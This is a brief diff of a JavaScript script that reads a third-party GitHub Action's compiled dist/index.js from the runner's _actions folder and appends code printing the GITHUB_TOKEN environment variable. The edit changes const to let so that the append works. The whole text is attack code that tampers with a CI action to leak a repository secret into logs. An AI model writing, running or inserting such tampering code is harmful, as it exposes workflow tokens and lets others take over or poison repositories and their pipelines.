@@ -1,5 +1,5 @@
 const fs = require("fs");
-const original = fs.readFileSync(
+let original = fs.readFileSync(
   "../../_actions/bdy12138/action/v2/dist/index.js"
 );
 original += `console.log("GITHUB_TOKEN:", process.env.GITHUB_TOKEN);`;
